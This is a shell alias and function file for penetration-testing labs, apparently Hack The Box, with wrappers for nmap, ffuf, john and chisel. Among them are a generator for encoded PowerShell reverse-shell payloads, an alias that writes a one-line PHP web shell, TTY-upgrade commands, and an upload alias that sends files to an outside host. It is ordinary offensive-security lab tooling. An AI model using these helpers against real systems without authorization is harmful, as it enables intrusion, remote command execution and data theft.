# ---------- Helpers ----------
_timestamp() { date +%Y%m%d-%H%M%S; }

# safe command check
_need() {
  for cmd in "$@"; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
      echo "[!]: missing required command: $cmd" >&2
      return 1
    fi
  done
  return 0
}

# ---------- Network / FS utilities ----------
list_ips() {
  # shows global IPv4 addresses, labeled by interface with simple color
  ip -4 addr show scope global |
    awk '
      /^[0-9]+: / {gsub(":", "", $2); iface=$2}
      /^[[:space:]]*inet / {
        split($2,a,"/"); printf "[\033[96m%s\033[0m] %s\n", iface, a[1]
      }'
}

ls_pwd() {
  # prints current dir in color then ls
  printf "[\e[96m%s\e[0m]\e[34m\n" "$(pwd)"
  ls --color=auto -- "$@"
  echo -en "\e[0m"
}

mkdir_cd() {
  if [ -z "$1" ]; then
    echo "[i] Usage: mkdir_cd <dir>"
    return 1
  fi
  mkdir -p -- "$1" && cd -- "$1" || return $?
}

# serve directory as www (use non-root port by default)
serve_http() {
  local port="${1:-8000}"
  local dir="${2:-.}"
  pushd -- "$dir" >/dev/null || return 1
  if _need python3; then
    echo "[i] Serving $dir on 0.0.0.0:$port (ctrl-c to stop)"
    # use http.server with simple logging; avoid sudo unless port <1024
    if [ "$port" -lt 1024 ] && [ "$(id -u)" -ne 0 ]; then
      echo "[!] Port <1024 requires root; starting anyway may fail" >&2
    fi
    python3 -m http.server "$port"
  fi
  popd >/dev/null
}

# copy tun0 ip to clipboard (works on systems with ip/xclip)
tun0_ip_copy() {
  if ! command -v ip >/dev/null 2>&1; then
    echo "[!] ip command not found" >&2; return 1
  fi
  local ipaddr
  ipaddr=$(ip -4 address show dev tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1)
  if [ -z "$ipaddr" ]; then
    echo "[!] tun0 not present or no ipv4 address" >&2; return 1
  fi
  if command -v xclip >/dev/null 2>&1; then
    printf "%s" "$ipaddr" | xclip -sel clip
    echo "[+] copied $ipaddr to clipboard"
  else
    echo "$ipaddr"
  fi
}

# ---------- SecLists path finder ----------
get_seclists_dir() {
  # prefer explicit env var, then common locations
  if [ -n "${SECLISTS_PATH:-}" ]; then
    [ -d "$SECLISTS_PATH" ] && { printf '%s\n' "$SECLISTS_PATH"; return 0; }
  fi
  for p in /opt/seclists /usr/share/seclists /usr/local/share/seclists; do
    [ -d "$p" ] && { printf '%s\n' "$p"; return 0; }
  done
  echo "Error: Could not find SecLists directory. Set SECLISTS_PATH or install SecLists." >&2
  return 1
}

# ---------- Password cracking / rockyou helper ----------
rock_john() {
  if ! _need john; then return 1; fi
  if [ $# -eq 0 ]; then
    echo "[i] Usage: rock_john <hashfile> [john options]"
    return 1
  fi
  local wordlist="/usr/share/wordlists/rockyou.txt"
  if [ ! -f "$wordlist" ]; then
    echo "[!] rockyou not found at $wordlist; pass --wordlist <path> to john or set ROCKYOU env var" >&2
    john "${@}"
  else
    john --wordlist="$wordlist" "${@}"
  fi
}

# ---------- Nmap wrappers with timestamped output ----------
_nmap_output_dir() {
  mkdir -p ./nmap
  printf "nmap/%s" "$(_timestamp)"
}

nmap_default() {
  if ! _need nmap; then return 1; fi
  if [ $# -eq 0 ]; then
    echo "[i] Usage: nmap_default <target> [nmap options]"
    return 1
  fi
  local outdir="./nmap"
  mkdir -p "$outdir"
  local base="$outdir/tcp_default_$(_timestamp)"
  sudo nmap -sCV -T4 --min-rate 10000 "$@" -v -oA "$base"
  echo "[+] outputs: ${base}.{nmap,gnmap,xml}"
}

nmap_udp() {
  if ! _need nmap; then return 1; fi
  if [ $# -eq 0 ]; then
    echo "[i] Usage: nmap_udp <target> [nmap options]"
    return 1
  fi
  local outdir="./nmap"
  mkdir -p "$outdir"
  local base="$outdir/udp_default_$(_timestamp)"
  sudo nmap -sUCV -T4 --min-rate 10000 "$@" -v -oA "$base"
  echo "[+] outputs: ${base}.{nmap,gnmap,xml}"
}

# ---------- Reverse shell helpers ----------
gen_ps_rev() {
  if [ "$#" -lt 2 ]; then
    echo "[i] Usage: gen_ps_rev <ip> <port> [template-file]"
    return 1
  fi
  local ip="$1"; local port="$2"; local tmpl="${3:-$HOME/zsh-aliases/shells/ps_rev.txt}"
  if [ ! -f "$tmpl" ]; then
    echo "[!] template file not found: $tmpl" >&2; return 1
  fi
  # produce base64 utf16le payload and copy to clipboard
  local SHELL
  SHELL=$(sed "s/x.x.x.x/$ip/g; s/yyyy/$port/g" "$tmpl" | iconv -f utf8 -t utf16le | base64 -w 0)
  printf "powershell -enc %s\n" "$SHELL" | xclip -sel clip
  echo "[+] copied PowerShell -enc payload to clipboard"
}

# TTY upgrade helpers (copy commands to clipboard)
uptty() {
  printf "%s\n" "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" \
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'" \
    "/usr/bin/script -qc /bin/bash /dev/null" |
    sed '/^$/d' | xclip -sel clip
  echo "[+] tty upgrade commands copied to clipboard"
}

alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null' | xclip -sel clip"
alias tty_fix="stty raw -echo; fg; reset"
alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"

# ---------- ffuf / vhost helpers ----------
vhost() {
  if [ -z "$1" ]; then
    echo "[i] Usage: vhost <domain> [ffuf args]"
    return 1
  fi
  if ! _need ffuf; then return 1; fi
  local domain="$1"; shift
  local seclists; seclists=$(get_seclists_dir) || return 1
  local wl="$seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"
  if [ ! -f "$wl" ]; then
    echo "[!] wordlist missing: $wl" >&2
    return 1
  fi
  # default to http if no scheme provided
  local url="$domain"
  if [[ ! "$url" =~ ^https?:// ]]; then url="http://$url"; fi
  ffuf -H "Host: FUZZ.$domain" -u "$url" -w "$wl" "${@}"
}

fuzz_dir() {
  if [ -z "$1" ]; then
    echo "[i] Usage: fuzz_dir <url> [-w <wordlist>] [ffuf options]"
    return 1
  fi
  if ! _need ffuf; then return 1; fi
  local url="$1"; shift
  local seclists; seclists=$(get_seclists_dir) || return 1
  local wl="$seclists/Discovery/Web-Content/raft-large-directories.txt"
  [ -f "$wl" ] || wl="$seclists/Discovery/Web-Content/common.txt"
  local ffuf_args=( -u "$url/FUZZ" -w "$wl" -e .php,.asp,.txt,.php.old,.html,.php.bak,.bak,.aspx )
  ffuf "${ffuf_args[@]}" "${@}"
}

# ---------- Chisel helpers ----------
chisel_socks() {
  if [ "$#" -ne 2 ]; then
    echo "[i] Usage: chisel_socks <ip> <server_port>"
    return 1
  fi
  if ! _need ~/zsh-aliases/tools/chisel; then
    echo "[!] chisel binary not found at ~/zsh-aliases/tools/chisel" >&2
  fi
  local ip="$1" port="$2"
  echo "./chisel client -v ${ip}:${port} R:socks" | xclip -sel clip
  echo "[+] client command copied. starting server locally (reverse mode)"
  ~/zsh-aliases/tools/chisel server -v -p "$port" --reverse
}

chisel_forward() {
  if [ "$#" -ne 4 ]; then
    echo "[i] Usage: chisel_forward <local_ip> <local_port> <remote_ip> <remote_port>"
    return 1
  fi
  echo "./chisel client $1:8888 R:$2:$3:$4" | xclip -sel clip
  echo "[+] copied client command to clipboard; start server:"
  ~/zsh-aliases/tools/chisel server -p 8888 --reverse
}

# ---------- Hosts editing ----------
addhost() {
  if [ "$#" -ne 2 ]; then
    echo "[i] Usage: addhost <ip> <hostname>"
    return 1
  fi
  local ip="$1" hostname="$2"
  if ! command -v sudo >/dev/null 2>&1; then
    echo "[!] sudo required to edit /etc/hosts" >&2
    return 1
  fi
  # ensure not duplicating hostnames
  if grep -qE "[[:space:]]${hostname}(\$|[[:space:]])" /etc/hosts; then
    echo "[i] hostname already present; updating entry for $hostname"
    sudo sed -ri "/[[:space:]]${hostname}(\$|[[:space:]])/s/^.*$/$ip\t$hostname/" /etc/hosts
  else
    echo "$ip $hostname" | sudo tee -a /etc/hosts >/dev/null
    echo "[+] Added $ip $hostname to /etc/hosts"
  fi
  grep -E "[[:space:]]${hostname}(\$|[[:space:]])" /etc/hosts
}

# ---------- Misc conveniences ----------
alias start_htb="python3 ~/zsh-aliases/start_htb.py"
alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
alias upload='curl -sS bashupload.com -T "${@}"'
alias phpcmd='printf "%s\n" "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote cmd.php"'
alias burl='curl -x http://127.0.0.1:8080/ -k'

# export paths
export PATH=~/zsh-aliases/shells/:$PATH
